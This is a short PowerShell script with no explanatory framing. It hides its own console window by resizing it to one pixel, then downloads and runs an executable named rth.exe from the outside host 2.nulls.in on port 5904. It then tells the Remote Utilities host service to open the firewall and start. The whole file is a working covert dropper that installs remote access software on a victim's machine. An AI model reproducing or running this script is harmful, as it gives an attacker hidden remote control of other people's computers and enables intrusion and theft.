Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")] 
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int W, int H); '

$consoleHWND = [Console.Window]::GetConsoleWindow();
$consoleHWND
[Console.Window]::MoveWindow($consoleHWND,0,0,1,1);


$client = new-object System.Net.WebClient -ErrorAction Stop
$client.DownloadFile("http://2.nulls.in:5904/rth.exe","$Env:USERPROFILE\rth.exe") ;
Start-Sleep -Seconds 1 -ErrorAction Stop
& $Env:USERPROFILE\rth.exe
Start-Sleep -Seconds 3 -ErrorAction Stop
& "C:\Program Files (x86)\Remote Utilities - Host\rutserv.exe" /firewall ;
& "C:\Program Files (x86)\Remote Utilities - Host\rutserv.exe" /start ;
Start-Sleep -Seconds 1 -ErrorAction Stop
exit;
